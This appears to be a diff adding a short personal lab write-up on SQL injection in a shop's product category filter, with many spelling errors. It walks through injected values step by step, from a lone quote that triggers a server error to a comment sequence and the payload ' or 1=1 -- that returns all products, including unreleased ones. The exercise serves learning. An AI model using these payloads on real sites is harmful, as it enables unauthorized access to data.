@@ -1,0 +1,36 @@
+sql-injection in the product categoery 
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+SQL injection attack that causes the application 
+to display one or more unreleased products.
+
+
+Anliysis:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+----
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+
+server responed as server error that a hint to sql-injection ver
+
+this query will result in syntax error 
+
+----
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+ignore the rest to escape syntac error
+
+----
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+no erorrs from website 100% that is a sql-injection ver
+
+----
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+
+get all products 
